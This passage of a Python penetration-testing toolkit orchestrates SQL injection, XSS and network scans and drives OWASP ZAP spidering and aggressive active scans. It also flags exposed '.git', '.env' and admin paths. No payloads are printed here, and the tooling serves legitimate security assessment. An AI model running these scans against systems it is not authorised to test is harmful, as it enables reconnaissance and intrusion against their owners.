        target_url: Target URL for testing
        scan_config: Configuration for scan types to run
    
    Returns:
        Dictionary of test results by test type
    """
    if not scan_config:
        scan_config = {
            'sql_injection': True,
            'xss': True,
            'api_discovery': True,
            'information_disclosure': True,
            'network_scan': False  # Requires hostname/IP extraction
        }
    
    results = {}
    
    try:
        # SQL Injection Testing
        if scan_config.get('sql_injection', False):
            results['sql_injection'] = sql_injection_test(target_url, test_type="comprehensive")
        
        # XSS Testing
        if scan_config.get('xss', False):
            results['xss'] = xss_test(target_url, test_type="comprehensive")
        
        # API Discovery
        if scan_config.get('api_discovery', False):
            results['api_discovery'] = api_endpoint_discovery(target_url)
        
        # Information Disclosure
        if scan_config.get('information_disclosure', False):
            results['information_disclosure'] = information_disclosure_test(target_url)
        
        # Command Injection
        if scan_config.get('command_injection', False):
            results['command_injection'] = command_injection_test(target_url)
        
        # XXE Testing
        if scan_config.get('xxe', False):
            results['xxe'] = xxe_test(target_url)
        
        # Network Scanning (if hostname can be extracted)
        if scan_config.get('network_scan', False):
            parsed_url = urlparse(target_url)
            if parsed_url.hostname:
                results['network_scan'] = nmap_scan(parsed_url.hostname, "comprehensive")
        
    except Exception as e:
        logging.error(f"Error in comprehensive scan: {e}")
    
    return results

def analyze_results_batch(results: Dict[str, ToolCallResult]) -> Dict[str, Any]:
    """
    Analyze batch test results and provide summary
    
    Args:
        results: Dictionary of ToolCallResult objects
    
    Returns:
        Analysis summary with risk assessment
    """
    analysis = {
        'total_tests': len(results),
        'successful_tests': 0,
        'total_vulnerabilities': 0,
        'max_cvss_score': 0.0,
        'risk_categories': {},
        'business_impact_summary': {},
        'compliance_risks': set()
    }
    
    for test_name, result in results.items():
        if result.success:
            analysis['successful_tests'] += 1
            analysis['total_vulnerabilities'] += len(result.vulnerabilities)
            
            if result.cvss_score > analysis['max_cvss_score']:
                analysis['max_cvss_score'] = result.cvss_score
            
            # Categorize by severity
            for vuln in result.vulnerabilities:
                if isinstance(vuln, Vulnerability):
                    severity = vuln.severity
                else:
                    severity = vuln.get('severity', 'Unknown')
                analysis['risk_categories'][severity] = analysis['risk_categories'].get(severity, 0) + 1
            
            # Business impact analysis
            if result.business_impact:
                impact_level = result.business_impact.split(' - ')[0] if ' - ' in result.business_impact else result.business_impact
                analysis['business_impact_summary'][impact_level] = analysis['business_impact_summary'].get(impact_level, 0) + 1
            
            # Compliance risks
            if result.compliance_risk:
                analysis['compliance_risks'].add(result.compliance_risk)
    
    # Convert set to list for JSON serialization
    analysis['compliance_risks'] = list(analysis['compliance_risks'])
    
    # Calculate overall risk level
    if analysis['max_cvss_score'] >= 9.0:
        analysis['overall_risk'] = 'CRITICAL'
    elif analysis['max_cvss_score'] >= 7.0:
        analysis['overall_risk'] = 'HIGH'
    elif analysis['max_cvss_score'] >= 4.0:
        analysis['overall_risk'] = 'MEDIUM'
    else:
        analysis['overall_risk'] = 'LOW'
    
    return analysis

# ===== UTILITY FUNCTIONS FOR INTEGRATION =====

def list_available_functions() -> List[Dict[str, str]]:
    """
    Get list of all available VAPT functions with descriptions
    
    Returns:
        List of function information dictionaries
    """
    functions = [
        {
            'name': 'sql_injection_test',
            'category': 'injection',
            'description': 'Comprehensive SQL injection testing with multiple techniques',
            'business_impact': 'CRITICAL - Database compromise'
        },
        {
            'name': 'sqlmap_campaign', 
            'category': 'injection',
            'description': 'Advanced SQLMap integration for expert-level SQL testing',
            'business_impact': 'CRITICAL - Advanced database exploitation'
        },
        {
            'name': 'xss_test',
            'category': 'injection',
            'description': 'Cross-site scripting testing with advanced payloads',
            'business_impact': 'HIGH - Client-side code execution'
        },
        {
            'name': 'nmap_scan',
            'category': 'reconnaissance',
            'description': 'Network reconnaissance and port scanning',
            'business_impact': 'MEDIUM - Network exposure analysis'
        },
        {
            'name': 'port_scan',
            'category': 'reconnaissance', 
            'description': 'Custom port scanning functionality',
            'business_impact': 'MEDIUM - Service discovery'
        },
        {
            'name': 'api_endpoint_discovery',
            'category': 'api_security',
            'description': 'Intelligent API endpoint enumeration',
            'business_impact': 'HIGH - API attack surface mapping'
        },
        {
            'name': 'jwt_vulnerability_test',
            'category': 'api_security',
            'description': 'Comprehensive JWT security assessment',
            'business_impact': 'CRITICAL - Authentication bypass'
        },
        {
            'name': 'idor_test',
            'category': 'authorization',
            'description': 'Insecure Direct Object Reference testing',
            'business_impact': 'HIGH - Unauthorized data access'
        },
        {
            'name': 'business_logic_test',
            'category': 'business_logic',
            'description': 'Business workflow and logic vulnerability testing',
            'business_impact': 'CRITICAL - Financial manipulation'
        },
        {
            'name': 'command_injection_test',
            'category': 'injection',
            'description': 'Operating system command injection testing',
            'business_impact': 'CRITICAL - System compromise'
        },
        {
            'name': 'xxe_test',
            'category': 'injection',
            'description': 'XML External Entity vulnerability testing',
            'business_impact': 'CRITICAL - File disclosure and SSRF'
        },
        {
            'name': 'information_disclosure_test',
            'category': 'information_disclosure',
            'description': 'Comprehensive information leakage assessment',
            'business_impact': 'HIGH - Sensitive data exposure'
        },
        {
            'name': 'run_comprehensive_scan',
            'category': 'orchestration',
            'description': 'Execute multiple test types in coordinated scan',
            'business_impact': 'VARIES - Complete security assessment'
        },
        {
            'name': 'execute_apt_simulation',
            'category': 'advanced',
            'description': 'Advanced Persistent Threat attack simulation',
            'business_impact': 'CATASTROPHIC - Multi-vector compromise'
        },
        {
            'name': 'zap_passive_scan',
            'category': 'zap_integration',
            'description': 'OWASP ZAP passive scanning with spidering',
            'business_impact': 'HIGH - Comprehensive passive vulnerability detection'
        },
        {
            'name': 'zap_active_scan',
            'category': 'zap_integration',
            'description': 'OWASP ZAP active vulnerability scanning',
            'business_impact': 'CRITICAL - Active vulnerability confirmation'
        },
        {
            'name': 'zap_authenticated_scan',
            'category': 'zap_integration',
            'description': 'OWASP ZAP authenticated scanning with session management',
            'business_impact': 'CRITICAL - Post-authentication vulnerability detection'
        },
        {
            'name': 'zap_comprehensive_scan',
            'category': 'zap_integration',
            'description': 'Complete ZAP assessment combining all scan types',
            'business_impact': 'CRITICAL - Industry-standard comprehensive assessment'
        },
        {
            'name': 'hybrid_comprehensive_scan',
            'category': 'hybrid',
            'description': 'Combined ZAP and custom testing for maximum coverage',
            'business_impact': 'MAXIMUM - Best-of-both-worlds security assessment'
        }
    ]
    
    return functions

def get_function_by_category(category: str) -> List[Dict[str, str]]:
    """
    Get functions filtered by category
    
    Args:
        category: Function category to filter by
    
    Returns:
        List of functions in the specified category
    """
    all_functions = list_available_functions()
    return [func for func in all_functions if func['category'] == category]

# ===== EXPORT CONFIGURATION =====

__all__ = [
    # Core testing functions
    'sql_injection_test', 'sqlmap_campaign', 'xss_test',
    'nmap_scan', 'port_scan', 'api_endpoint_discovery', 'jwt_vulnerability_test',
    'idor_test', 'business_logic_test', 'command_injection_test', 
    'xxe_test', 'information_disclosure_test',
    
    # OWASP ZAP functions
    'zap_passive_scan', 'zap_active_scan', 'zap_authenticated_scan', 'zap_comprehensive_scan',
    'zap_ajax_spider_scan', 'zap_deep_crawl_scan', 'zap_advanced_active_scan', 'zap_enterprise_scan',
    
    # Hybrid scanning functions
    'hybrid_comprehensive_scan',
    
    # Orchestration functions
    'run_comprehensive_scan', 'execute_apt_simulation', 'analyze_results_batch',
    
    # Configuration functions
    'configure_vapt', 'get_vapt_config', 'reset_vapt_config',
    
    # Utility functions
    'list_available_functions', 'get_function_by_category',
    'setup_logging', 'create_session', 'save_results',
    
    # Data structures
    'ToolCallResult', 'Vulnerability', 'PayloadLibrary', 'create_vulnerability',
    
    # Global configuration
    'VAPT_CONFIG'
]

# Initialize logging on module import
logger = setup_logging(VAPT_CONFIG.get('debug', False))
logger.info("Elite VAPT Function Toolkit initialized successfully")
logger.info(f"Available functions: {len(list_available_functions())}")
logger.info(f"Tool availability: nmap={NMAP_CLI_AVAILABLE}, crypto={CRYPTOGRAPHY_AVAILABLE}")

# Ensure output directory exists
Path(VAPT_CONFIG['output_dir']).mkdir(parents=True, exist_ok=True)

def zap_ajax_spider_scan(target_url: str, max_duration: int = 5) -> ToolCallResult:
    """
    Execute OWASP ZAP AJAX Spider for JavaScript-heavy applications
    
    Args:
        target_url: Target URL for AJAX spidering
        max_duration: Maximum duration in minutes
    
    Returns:
        ToolCallResult with AJAX spider findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not ZAP_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="ZAP AJAX Spider",
            error="ZAP library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        
        # Test ZAP connection
        try:
            zap.core.version
        except Exception as e:
            return ToolCallResult(
                success=False,
                tool_name="ZAP AJAX Spider",
                error=f"Cannot connect to ZAP: {str(e)}",
                execution_time=time.time() - start_time
            )
        
        # Start AJAX spider
        logging.info(f"Starting ZAP AJAX spider on {target_url}")
        zap.ajaxSpider.scan(target_url)
        
        # Monitor AJAX spider progress
        max_duration_seconds = max_duration * 60
        start_ajax = time.time()
        
        while zap.ajaxSpider.status == 'running':
            if time.time() - start_ajax > max_duration_seconds:
                logging.info("AJAX spider timeout reached, stopping")
                zap.ajaxSpider.stop()
                break
            time.sleep(2)
        
        # Get discovered URLs
        ajax_results = zap.ajaxSpider.results()
        
        # Analyze AJAX-discovered endpoints for vulnerabilities
        for url in ajax_results:
            # Check for sensitive endpoints discovered via AJAX
            if any(sensitive in url.lower() for sensitive in 
                  ['admin', 'api', 'upload', 'config', 'debug', 'test']):
                vuln = create_vulnerability(
                    vuln_type='Sensitive Endpoint Discovery',
                    severity='Medium',
                    evidence=f'AJAX spider discovered sensitive endpoint: {url}',
                    url=url,
                    tool='OWASP ZAP AJAX',
                    technique='AJAX spidering',
                    business_impact='Sensitive functionality exposed through client-side navigation',
                    remediation="Review endpoint accessibility and implement proper access controls"
                )
                vulnerabilities.append(vuln)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP AJAX Spider",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'max_duration': max_duration,
                'urls_discovered': len(ajax_results),
                'ajax_results': ajax_results[:50]  # Limit for metadata size
            },
            business_impact=f"AJAX spider: {len(ajax_results)} JavaScript-accessible URLs discovered",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="JavaScript application mapping for attack surface analysis"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP AJAX Spider",
            error=f"AJAX spider failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def zap_deep_crawl_scan(target_url: str, crawl_depth: int = 3, 
                       include_ajax: bool = True, include_forms: bool = True) -> ToolCallResult:
    """
    Execute deep ZAP crawling combining traditional spider, AJAX spider, and form analysis
    
    Args:
        target_url: Target URL for deep crawling
        crawl_depth: Maximum crawl depth
        include_ajax: Whether to include AJAX spidering
        include_forms: Whether to analyze forms
    
    Returns:
        ToolCallResult with comprehensive crawl findings
    """
    start_time = time.time()
    vulnerabilities = []
    all_urls = set()
    
    if not ZAP_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Deep Crawl",
            error="ZAP library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        
        # Phase 1: Traditional spider
        logging.info("Phase 1: Traditional spidering")
        spider_id = zap.spider.scan(target_url, maxdepth=crawl_depth, recurse=True)
        
        while int(zap.spider.status(spider_id)) < 100:
            time.sleep(2)
        
        spider_urls = zap.spider.results(spider_id)
        all_urls.update(spider_urls)
        
        # Phase 2: AJAX spider (if enabled)
        if include_ajax:
            logging.info("Phase 2: AJAX spidering")
            ajax_result = zap_ajax_spider_scan(target_url, max_duration=3)
            if ajax_result.success:
                ajax_urls = ajax_result.metadata.get('ajax_results', [])
                all_urls.update(ajax_urls)
                vulnerabilities.extend(ajax_result.vulnerabilities)
        
        # Phase 3: Form analysis (if enabled)
        if include_forms:
            logging.info("Phase 3: Form analysis")
            form_vulns = _analyze_discovered_forms(list(all_urls))
            vulnerabilities.extend(form_vulns)
        
        # Phase 4: URL pattern analysis
        pattern_vulns = _analyze_url_patterns(list(all_urls))
        vulnerabilities.extend(pattern_vulns)
        
        # Phase 5: Technology fingerprinting
        tech_vulns = _analyze_technology_stack(target_url, zap)
        vulnerabilities.extend(tech_vulns)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Deep Crawl",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'crawl_depth': crawl_depth,
                'total_urls_discovered': len(all_urls),
                'spider_urls': len(spider_urls),
                'ajax_enabled': include_ajax,
                'forms_analyzed': include_forms,
                'sample_urls': list(all_urls)[:20]
            },
            business_impact=f"Deep crawl: {len(all_urls)} URLs discovered, attack surface mapped",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Comprehensive application mapping and vulnerability discovery"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Deep Crawl",
            error=f"Deep crawl failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def zap_advanced_active_scan(target_url: str, scan_policy: str = "Default Policy",
                           custom_payloads: Dict[str, List[str]] = None,
                           max_scan_time: int = 15) -> ToolCallResult:
    """
    Execute advanced ZAP active scan with custom payloads and evasion techniques
    
    Args:
        target_url: Target URL for scanning
        scan_policy: ZAP scan policy to use
        custom_payloads: Custom payload dictionary for specific vulnerability types
        max_scan_time: Maximum scan time in minutes
    
    Returns:
        ToolCallResult with advanced active scan findings
    """
    start_time = time.time()
    vulnerabilities = []
    
    if not ZAP_AVAILABLE:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Advanced Active Scan",
            error="ZAP library not available",
            execution_time=time.time() - start_time
        )
    
    try:
        zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
        
        # Configure advanced scan settings
        logging.info("Configuring advanced scan settings")
        
        # Set aggressive scan parameters
        zap.ascan.set_option_max_scans_in_ui(10)
        zap.ascan.set_option_thread_per_host(5)
        zap.ascan.set_option_host_per_scan(3)
        
        # Add custom payloads if provided
        if custom_payloads:
            _configure_custom_payloads(zap, custom_payloads)
        
        # Start comprehensive active scan
        logging.info(f"Starting advanced active scan on {target_url}")
        scan_id = zap.ascan.scan(
            target_url, 
            recurse=True, 
            inscopeonly=False,
            scanpolicyname=scan_policy,
            method=None,
            postdata=None
        )
        
        # Monitor scan progress with detailed logging
        scan_timeout = max_scan_time * 60
        scan_start = time.time()
        last_progress = 0
        
        while int(zap.ascan.status(scan_id)) < 100:
            current_progress = int(zap.ascan.status(scan_id))
            
            if current_progress > last_progress:
                logging.info(f"Advanced scan progress: {current_progress}%")
                last_progress = current_progress
            
            if time.time() - scan_start > scan_timeout:
                logging.info("Advanced scan timeout reached, stopping")
                zap.ascan.stop(scan_id)
                break
            
            time.sleep(5)
        
        # Get comprehensive scan results
        alerts = zap.core.alerts()
        
        # Enhanced alert processing with context analysis
        for alert in alerts:
            risk_level = _map_zap_risk_to_severity(alert.get('risk', 'Low'))
            
            # Enhanced evidence collection
            evidence_parts = []
            if alert.get('description'):
                evidence_parts.append(f"Description: {alert['description']}")
            if alert.get('attack'):
                evidence_parts.append(f"Attack: {alert['attack']}")
            if alert.get('evidence'):
                evidence_parts.append(f"Evidence: {alert['evidence']}")
            
            enhanced_evidence = " | ".join(evidence_parts)
            
            # Context-aware vulnerability classification
            vuln_type = _enhance_vulnerability_type(alert.get('alert', 'ZAP Finding'), alert)
            
            vuln = create_vulnerability(
                vuln_type=vuln_type,
                severity=risk_level,
                evidence=enhanced_evidence,
                url=alert.get('url', target_url),
                parameter=alert.get('param', ''),
                payload=alert.get('attack', ''),
                tool='OWASP ZAP Advanced',
                technique='Advanced active vulnerability scanning',
                cvss_score=_calculate_enhanced_cvss(alert),
                business_impact=_assess_business_impact(alert),
                remediation=_generate_detailed_remediation(alert),
                references=_extract_references(alert)
            )
            vulnerabilities.append(vuln)
        
        execution_time = time.time() - start_time
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Advanced Active Scan",
            vulnerabilities=vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'scan_policy': scan_policy,
                'max_scan_time': max_scan_time,
                'custom_payloads_used': bool(custom_payloads),
                'total_alerts': len(alerts),
                'scan_configuration': 'Advanced with evasion techniques'
            },
            business_impact=f"Advanced active scan: {len(vulnerabilities)} vulnerabilities confirmed with enhanced detection",
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in vulnerabilities] + [0.0]),
            compliance_risk="Advanced vulnerability verification with evasion testing"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Advanced Active Scan",
            error=f"Advanced active scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

def zap_enterprise_scan(target_url: str, auth_config: Dict[str, str] = None,
                       scan_config: Dict[str, Any] = None) -> ToolCallResult:
    """
    Execute enterprise-grade ZAP scan matching the comprehensive script's capabilities
    
    Args:
        target_url: Target URL for enterprise scanning
        auth_config: Authentication configuration
        scan_config: Advanced scan configuration
    
    Returns:
        ToolCallResult with enterprise-grade findings
    """
    start_time = time.time()
    all_vulnerabilities = []
    scan_metadata = {}
    
    if not scan_config:
        scan_config = {
            'deep_crawl': True,
            'ajax_spider': True,
            'advanced_active': True,
            'authenticated_scan': bool(auth_config),
            'technology_detection': True,
            'max_crawl_depth': 5,
            'max_scan_time': 20
        }
    
    try:
        # Phase 1: Deep crawling (equivalent to script's Playwright + ZAP spider)
        if scan_config.get('deep_crawl', True):
            logging.info("Phase 1: Enterprise deep crawling")
            crawl_result = zap_deep_crawl_scan(
                target_url, 
                crawl_depth=scan_config.get('max_crawl_depth', 5),
                include_ajax=scan_config.get('ajax_spider', True)
            )
            if crawl_result.success:
                all_vulnerabilities.extend(crawl_result.vulnerabilities)
                scan_metadata['crawl_urls'] = crawl_result.metadata.get('total_urls_discovered', 0)
        
        # Phase 2: Advanced active scanning (equivalent to script's ZAP active scan)
        if scan_config.get('advanced_active', True):
            logging.info("Phase 2: Enterprise active scanning")
            active_result = zap_advanced_active_scan(
                target_url,
                max_scan_time=scan_config.get('max_scan_time', 20)
            )
            if active_result.success:
                all_vulnerabilities.extend(active_result.vulnerabilities)
                scan_metadata['active_alerts'] = len(active_result.vulnerabilities)
        
        # Phase 3: Authenticated scanning (if credentials provided)
        if scan_config.get('authenticated_scan', False) and auth_config:
            logging.info("Phase 3: Enterprise authenticated scanning")
            auth_result = zap_authenticated_scan(target_url, auth_config, "both")
            if auth_result.success:
                all_vulnerabilities.extend(auth_result.vulnerabilities)
                scan_metadata['auth_findings'] = len(auth_result.vulnerabilities)
        
        # Phase 4: Technology detection and analysis
        if scan_config.get('technology_detection', True):
            logging.info("Phase 4: Technology stack analysis")
            zap = ZAPv2(proxies={'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'})
            tech_vulns = _analyze_technology_stack(target_url, zap)
            all_vulnerabilities.extend(tech_vulns)
            scan_metadata['tech_findings'] = len(tech_vulns)
        
        # Deduplicate and prioritize findings
        unique_vulnerabilities = _deduplicate_and_prioritize_enterprise_findings(all_vulnerabilities)
        
        execution_time = time.time() - start_time
        
        # Calculate comprehensive business impact
        critical_count = sum(1 for v in unique_vulnerabilities if 
                           (v.severity if isinstance(v, Vulnerability) else v.get('severity', '')) == 'Critical')
        high_count = sum(1 for v in unique_vulnerabilities if 
                        (v.severity if isinstance(v, Vulnerability) else v.get('severity', '')) == 'High')
        
        if critical_count > 0:
            business_impact = f"ENTERPRISE CRITICAL - {critical_count} critical vulnerabilities requiring immediate remediation"
        elif high_count > 0:
            business_impact = f"ENTERPRISE HIGH - {high_count} high-risk vulnerabilities identified"
        else:
            business_impact = f"ENTERPRISE ASSESSMENT - {len(unique_vulnerabilities)} security issues documented"
        
        return ToolCallResult(
            success=True,
            tool_name="ZAP Enterprise Scan",
            vulnerabilities=unique_vulnerabilities,
            execution_time=execution_time,
            metadata={
                'target_url': target_url,
                'scan_phases_completed': 4,
                'authenticated': bool(auth_config),
                **scan_metadata,
                'total_unique_findings': len(unique_vulnerabilities),
                'critical_findings': critical_count,
                'high_findings': high_count,
                'scan_configuration': scan_config
            },
            business_impact=business_impact,
            cvss_score=max([v.cvss_score if isinstance(v, Vulnerability) else v.get('cvss_score', 0.0) for v in unique_vulnerabilities] + [0.0]),
            compliance_risk="Enterprise-grade security assessment meeting industry standards"
        )
        
    except Exception as e:
        return ToolCallResult(
            success=False,
            tool_name="ZAP Enterprise Scan",
            error=f"Enterprise scan failed: {str(e)}",
            execution_time=time.time() - start_time
        )

# ===== ADVANCED ZAP HELPER FUNCTIONS =====

def _analyze_discovered_forms(urls: List[str]) -> List[Vulnerability]:
    """Analyze discovered forms for security issues"""
    vulnerabilities = []
    
    try:
        session = create_session()
        
        for url in urls[:50]:  # Limit analysis
            try:
                response = session.get(url, timeout=10)
                if response.status_code == 200 and 'form' in response.text.lower():
                    # Check for forms without CSRF protection
                    if '<form' in response.text and 'csrf' not in response.text.lower():
                        vuln = create_vulnerability(
                            vuln_type='Missing CSRF Protection',
                            severity='Medium',
                            evidence=f'Form found without apparent CSRF token at {url}',
                            url=url,
                            tool='ZAP Form Analysis',
                            technique='Form security analysis',
                            remediation="Implement CSRF tokens for all forms"
                        )
                        vulnerabilities.append(vuln)
                    
                    # Check for password fields without autocomplete=off
                    if 'type="password"' in response.text and 'autocomplete="off"' not in response.text:
                        vuln = create_vulnerability(
                            vuln_type='Password Autocomplete Enabled',
                            severity='Low',
                            evidence=f'Password field allows autocomplete at {url}',
                            url=url,
                            tool='ZAP Form Analysis',
                            technique='Form security analysis',
                            remediation="Add autocomplete='off' to password fields"
                        )
                        vulnerabilities.append(vuln)
                        
            except Exception:
                continue
                
    except Exception as e:
        logging.error(f"Error analyzing forms: {e}")
    
    return vulnerabilities

def _analyze_url_patterns(urls: List[str]) -> List[Vulnerability]:
    """Analyze URL patterns for security issues"""
    vulnerabilities = []
    
    # Check for potentially dangerous patterns
    dangerous_patterns = {
        'admin': 'Administrative interface exposed',
        'debug': 'Debug interface exposed',
        'test': 'Test interface exposed',
        'config': 'Configuration interface exposed',
        'backup': 'Backup files exposed',
        '.git': 'Git repository exposed',
        '.env': 'Environment file exposed',
        'phpinfo': 'PHP info page exposed'
    }
    
    for url in urls:
        url_lower = url.lower()
        for pattern, description in dangerous_patterns.items():
            if pattern in url_lower:
                severity = 'Critical' if pattern in ['.git', '.env', 'config'] else 'High'
                vuln = create_vulnerability(
                    vuln_type='Sensitive URL Exposure',
                    severity=severity,
                    evidence=f'{description}: {url}',
                    url=url,
                    tool='ZAP URL Analysis',
                    technique='URL pattern analysis',
                    remediation=f"Remove or protect access to {pattern} endpoints"
                )
                vulnerabilities.append(vuln)
    
    return vulnerabilities

def _analyze_technology_stack(target_url: str, zap) -> List[Vulnerability]:
    """Analyze technology stack for known vulnerabilities"""
    vulnerabilities = []
    
    try:
        # Get technology information from ZAP
        tech_info = {}
        
        # Try to get response headers for technology detection
        session = create_session()
        response = session.get(target_url)
        
        # Analyze server headers
        server_header = response.headers.get('server', '')
        if server_header:
            # Check for version disclosure
            if any(version_indicator in server_header.lower() for version_indicator in 
                  ['apache/2.2', 'nginx/1.1', 'iis/7.', 'iis/8.']):
                vuln = create_vulnerability(
                    vuln_type='Outdated Server Version',
                    severity='Medium',
                    evidence=f'Potentially outdated server: {server_header}',
                    url=target_url,
                    tool='ZAP Technology Analysis',
                    technique='Header analysis',
                    remediation="Update server software to latest version"
                )
                vulnerabilities.append(vuln)
        
        # Check for technology-specific headers
        tech_headers = {
            'x-powered-by': 'Technology disclosure',
            'x-aspnet-version': 'ASP.NET version disclosure',
            'x-generator': 'Framework disclosure'
        }
        
        for header, description in tech_headers.items():
            if header in response.headers:
                vuln = create_vulnerability(
                    vuln_type='Technology Disclosure',
                    severity='Low',
                    evidence=f'{description}: {response.headers[header]}',
                    url=target_url,
                    tool='ZAP Technology Analysis',
                    technique='Header analysis',
                    remediation=f"Remove or obfuscate {header} header"
                )
                vulnerabilities.append(vuln)
                
    except Exception as e:
        logging.error(f"Error analyzing technology stack: {e}")
    
    return vulnerabilities

def _configure_custom_payloads(zap, custom_payloads: Dict[str, List[str]]):
    """Configure custom payloads in ZAP"""
    try:
        for vuln_type, payloads in custom_payloads.items():
            # This would require ZAP plugin configuration
            # Implementation depends on specific ZAP API capabilities
            logging.info(f"Configured {len(payloads)} custom payloads for {vuln_type}")
    except Exception as e:
        logging.error(f"Error configuring custom payloads: {e}")

def _enhance_vulnerability_type(base_type: str, alert: Dict) -> str:
    """Enhance vulnerability type with additional context"""
    url = alert.get('url', '')
    param = alert.get('param', '')
    
    # Add context-specific enhancements
    if 'admin' in url.lower():
        return f"Admin Panel {base_type}"
    elif 'api' in url.lower():
        return f"API {base_type}"
    elif param:
        return f"{base_type} (Parameter: {param})"
    else:
        return base_type

def _calculate_enhanced_cvss(alert: Dict) -> float:
    """Calculate enhanced CVSS score with additional context"""
    base_score = _map_zap_risk_to_cvss(alert.get('risk', 'Low'))
    
    # Enhance score based on context
    url = alert.get('url', '').lower()
    if 'admin' in url:
        base_score = min(base_score + 1.0, 10.0)
    elif 'api' in url:
        base_score = min(base_score + 0.5, 10.0)
    
    return base_score

def _assess_business_impact(alert: Dict) -> str:
    """Assess business impact with enhanced context"""
    risk = alert.get('risk', 'Low')
    url = alert.get('url', '')
    
    base_impact = f"ZAP Risk: {risk}"
    
    if 'admin' in url.lower():
        return f"CRITICAL - Administrative interface vulnerability - {base_impact}"
    elif 'api' in url.lower():
        return f"HIGH - API security vulnerability - {base_impact}"
    elif 'login' in url.lower():
        return f"HIGH - Authentication system vulnerability - {base_impact}"
    else:
        return base_impact

def _generate_detailed_remediation(alert: Dict) -> str:
    """Generate detailed remediation advice"""
    base_solution = alert.get('solution', 'Review ZAP documentation')
    alert_type = alert.get('alert', '').lower()
    
    # Enhanced remediation based on vulnerability type
    enhanced_remediation = {
        'cross site scripting': 'Implement proper input validation, output encoding, and Content Security Policy (CSP)',
        'sql injection': 'Use parameterized queries, input validation, and principle of least privilege for database access',
        'path traversal': 'Implement proper input validation and use secure file access APIs',
        'missing anti-csrf tokens': 'Implement CSRF tokens for all state-changing operations',
        'cookie without secure flag': 'Set Secure flag for all cookies transmitted over HTTPS'
    }
    
    for vuln_type, detailed_fix in enhanced_remediation.items():
        if vuln_type in alert_type:
            return f"{detailed_fix}. {base_solution}"
    
    return base_solution

def _extract_references(alert: Dict) -> List[str]:
    """Extract and enhance references"""
    refs = []
    
    if alert.get('reference'):
        refs.append(alert['reference'])
    
    # Add standard references based on vulnerability type
    alert_type = alert.get('alert', '').lower()
    if 'xss' in alert_type:
        refs.append('https://owasp.org/www-community/attacks/xss/')
    elif 'sql injection' in alert_type:
        refs.append('https://owasp.org/www-community/attacks/SQL_Injection')
    elif 'csrf' in alert_type:
        refs.append('https://owasp.org/www-community/attacks/csrf')
    
    return refs

def _deduplicate_and_prioritize_enterprise_findings(vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
    """Enterprise-grade deduplication and prioritization"""
    seen = {}
    prioritized_vulns = []
    
    # Severity priority order
    severity_order = {'Critical': 0, 'High': 1, 'Medium': 2, 'Low': 3, 'Info': 4}
    
    for vuln in vulnerabilities:
        if isinstance(vuln, Vulnerability):
            key = f"{vuln.type}|{vuln.url}|{vuln.parameter}"
            severity = vuln.severity
        else:
            key = f"{vuln.get('type', '')}|{vuln.get('url', '')}|{vuln.get('parameter', '')}"
            severity = vuln.get('severity', 'Low')
        
        if key not in seen:
            seen[key] = vuln
        else:
            # Keep the higher severity finding
            existing_severity = seen[key].severity if isinstance(seen[key], Vulnerability) else seen[key].get('severity', 'Low')
            if severity_order.get(severity, 4) < severity_order.get(existing_severity, 4):
                seen[key] = vuln
    
    # Sort by severity and return
    prioritized_vulns = list(seen.values())
    prioritized_vulns.sort(key=lambda x: severity_order.get(
        x.severity if isinstance(x, Vulnerability) else x.get('severity', 'Low'), 4))
    
    return prioritized_vulns

